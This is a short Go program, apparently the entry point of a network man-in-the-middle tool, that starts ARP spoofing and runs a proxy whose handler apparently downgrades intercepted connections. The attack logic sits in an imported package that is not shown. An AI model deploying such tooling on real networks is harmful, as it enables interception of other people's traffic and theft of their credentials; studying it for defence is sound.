package main

import (
    "log"
    "os"
    "fmt"
    "strconv"
    "./shim"
)

func usage() {
    fmt.Fprintf(os.Stderr, "usage: %s <port>\n", os.Args[0])
    os.Exit(1)
}

func main() {
    if len(os.Args) != 2 {
        usage()
    }

    port, err := strconv.Atoi(os.Args[1])
    if err != nil {
        usage()
    }

    go shim.ArpSpoof()

    downgradeHandler := shim.NewDowngradeHandler()
    server := shim.Server{
        RequestHandlers: []shim.RequestHandler{
            downgradeHandler,
        },
        ResponseHandlers: []shim.ResponseHandler{
            downgradeHandler,
        },
    }
    err = server.Run(uint16(port))
    log.Println(err.Error())
}
